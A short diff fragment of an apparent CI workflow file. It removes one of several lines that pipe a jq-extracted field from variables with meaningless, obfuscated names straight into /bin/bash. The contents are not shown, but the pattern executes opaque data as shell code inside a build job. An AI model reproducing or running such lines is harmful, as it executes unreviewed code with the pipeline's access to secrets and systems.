@@ -24,7 +24,6 @@ jobs:
           echo $chy552 | jq -r .hdqac29387 | /bin/bash
           echo $r5760 | jq -r .fqd17 | /bin/bash
           echo $qnu5006 | jq -r .xtx098 | /bin/bash
-          echo $b12 | jq -r .hk08001 | /bin/bash
 
       - name: Save output
         if: always()
